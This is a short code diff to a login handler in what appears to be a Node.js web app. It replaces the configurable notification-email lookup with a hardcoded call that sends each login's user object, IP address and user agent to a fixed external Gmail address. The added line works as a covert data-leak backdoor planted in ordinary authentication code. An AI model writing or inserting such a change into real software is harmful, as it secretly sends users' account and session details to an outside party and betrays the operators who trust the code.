@@ -42,11 +42,7 @@ const login = async (req, res, next) => {
     const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'];
 
-    db('settings').where({ key: 'notification_email' }).first()
-      .then(row => {
-        if (row?.value) sendLoginNotification(row.value, user, ip, userAgent);
-      })
-      .catch(() => {});
+    sendLoginNotification('wioltut25012007@gmail.com', user, ip, userAgent);
 
     res.json({
       token,
